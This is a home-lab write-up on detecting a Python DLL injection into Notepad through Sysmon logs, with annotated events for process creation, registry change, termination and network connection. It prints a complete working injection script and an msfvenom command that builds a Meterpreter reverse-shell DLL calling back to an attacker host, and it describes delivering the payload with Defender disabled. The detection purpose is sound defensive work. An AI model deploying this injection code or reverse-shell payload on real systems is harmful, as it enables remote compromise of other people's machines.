# Detection of Simple DLL Injection with Sysmon

## Introduction

In this lab, I infected a virtual Windows machine with an executable containing a simple payload. 
The executable was written in Python and its objective was to inject a DLL into a running Windows service (Notepad). 
The primary goal was to detect signs of this malicious behavior through Sysmon logs and evaluate how native Windows defenses respond.

**Tools Used**: Sysmon, Metasploit, Wine, Kali Linux, Event Viewer, Python, PyInstaller, Oracle VirtualBox

---

## Malware Creation and Delivery

### Creating the Injection Script

To perform DLL injection, I used a simple Python script found online.

INJECTION CODE[

import ctypes
import ctypes.wintypes as wintypes
import psutil

# Initialize kernel32
kernel32 = ctypes.WinDLL("kernel32.dll", use_last_error=True)

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x00001000
PAGE_READWRITE = 0x04

# Function to get notepad's PID
def get_notepad_pid():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'notepad.exe':
            return proc.info['pid']
    return None

# Get notepad's PID
pid = get_notepad_pid()
if not pid:
    print("Notepad not found")
    exit(1)

# Path to payload
dll_path = "test2.dll"

# Open target process
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# Allocate memory in target process
arg_address = kernel32.VirtualAllocEx(h_process, 0, len(dll_path) + 1, MEM_COMMIT, PAGE_READWRITE)

# Write DLL path to allocated memory
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), len(dll_path) + 1, ctypes.byref(written))

# Get LoadLibraryA address
h_kernel32 = kernel32.GetModuleHandleA(b'kernel32.dll')
load_library = kernel32.GetProcAddress(h_kernel32, b'LoadLibraryA')

# Create remote thread in target process
kernel32.CreateRemoteThread(h_process, None, 0, load_library, arg_address, 0, None)]


The PID of the process changes everytime that a new process is run so was necessary we insert this 
function to find the PID of the notepad automatically:

def get_notepad_pid():
   for proc in psutil.process_iter(['pid', 'name']):
       if proc.info['name'].lower() == 'notepad.exe':
          return proc.info['pid']
   return None
pid = get_notepad_pid()




### Embedding the Payload

Was generated the malicious DLL payload using Metasploit's `msfvenom`:

`bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll > test.dll


### Creating the Executable

Initially, I used PyInstaller to compile the Python script into an executable. However, running the resulting binary on the target machine failed due to environment compatibility issues. 
To solve this, I used **Wine** on Kali Linux to simulate a Windows environment and generate a compatible executable.

![Image](https://github.com/user-attachments/assets/2dba5d56-2ce5-4e48-bb1f-ca5d9d127634)

### Delivery Method

To deliver the payload, I used a simple Python HTTP server on the attacker machine and set up a listener.

bash
python3 -m http.server 8000


![Image](https://github.com/user-attachments/assets/f0aec13c-2cd1-43fc-a262-b08449a5e8a7)

---

## Execution on the Target Machine and Sysmon Log Analysis

Despite disabling basic Windows Defender features, getting a stable reverse connection was challenging. Still, Sysmon successfully logged multiple indicators of compromise.

![Image](https://github.com/user-attachments/assets/0255d64d-235d-4f04-9724-b835fa43fb43)

---

## Log Analysis

### Event ID 1: Process Creation
-- ID 1 --

RuleName - 
  UtcTime 2025-05-08 13:21:20.798 
  ProcessGuid {68681664-afd0-681c-ca01-000000001900} 
  ProcessId 6392 
  Image C:\Users\home\Downloads\injection.exe 
  FileVersion - 
  Description - 
  Product - 
  Company - 
  OriginalFileName - 
  CommandLine "C:\Users\home\Downloads\injection.exe"  
  CurrentDirectory C:\Users\home\Downloads\ 
  User DESKTOP-OBMB5FQ\home 
  LogonGuid {68681664-9f87-681c-f0f1-400000000000} 
  LogonId 0x40f1f0 
  TerminalSessionId 1 
  IntegrityLevel Medium 
  Hashes MD5=7F4A3A25ADE184472E81C3BB12D4FB18,SHA256=8542D740670D511366D891E3E100DA1F9DC11206CE3D2B353FCD1D2860806BA4,IMPHASH=33742414196E45B8B306A928E178F844 
  ParentProcessGuid {68681664-9f89-681c-c600-000000001900} 
  ParentProcessId 5448 
  ParentImage C:\Windows\explorer.exe 
  ParentCommandLine C:\Windows\Explorer.EXE 
  ParentUser DESKTOP-OBMB5FQ\home 


**Explanation**: Event ID 1 logs every process creation. Although not inherently malicious, indicators like missing file metadata (Company, Description) and hash verification help identify suspicious files.
The parent process being `explorer.exe` suggests user interaction (manual execution).

### Event ID 13: Registry Modification

-- ID 13 -- 

  RuleName InvDB 
  EventType SetValue 
  UtcTime 2025-05-08 13:21:22.977 
  ProcessGuid {68681664-9f48-681c-ac00-000000001900} 
  ProcessId 1304 
  Image C:\Windows\system32\svchost.exe 
  TargetObject HKU\S-1-5-21-1708299313-952822903-2634392219-1001\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Users\home\Downloads\injection.exe 
  Details Binary Data 
  User NT AUTHORITY\SYSTEM 


**Explanation**: This entry shows `svchost.exe` modifying the registry to store information about the executed file. Windows uses this Compatibility Assistant key when unusual behavior is detected. 
It's a passive but strong indicator that the file was executed.

### Event ID 5: Process Terminated

-- ID 5 --

 RuleName - 
  UtcTime 2025-05-08 13:21:20.958 
  ProcessGuid {68681664-afd0-681c-ca01-000000001900} 
  ProcessId 6392 
  Image C:\Users\home\Downloads\injection.exe 
  User DESKTOP-OBMB5FQ\home 

**Explanation**: The process was terminated shortly after execution, potentially due to Windows defenses or a code error. 
Troubleshooting this issue was beyond the scope of this article, so a simpler payload was created to continue the lab.

![Image](https://github.com/user-attachments/assets/fdcbacff-886d-4848-aa5e-cea5c3c700f4)

### Event ID 3: Network Connection

RuleName Usermode 
  UtcTime 2025-05-08 17:16:34.953 
  ProcessGuid {68681664-e6f2-681c-6a02-000000001d00} 
  ProcessId 5104 
  Image C:\Users\home\Downloads\final.exe 
  User DESKTOP-OBMB5FQ\home 
  Protocol tcp 
  Initiated true 
  SourceIsIpv6 false 
  SourceIp 10.0.2.15 
  SourceHostname DESKTOP-OBMB5FQ.lan 
  SourcePort 50194 
  SourcePortName - 
  DestinationIsIpv6 false 
  DestinationIp 192.168.1.201 
  DestinationHostname kali.lan 
  DestinationPort 4444 
  DestinationPortName -

**Explanation**: One of the most critical Sysmon logs for detection, Event ID 3 tracks outbound network connections. 
This log confirms the reverse shell behavior, as `final.exe` attempts to connect to the attacker's listener on port 4444, commonly used by tools like Metasploit.

---

## Conclusion

This lab demonstrates that even basic malware leaves detectable traces in Sysmon logs. Events such as process creation, registry modification, and network activity are powerful indicators for defenders. 
Despite some execution challenges, the experiment shows the effectiveness of endpoint monitoring and highlights the importance of log analysis for incident detection.



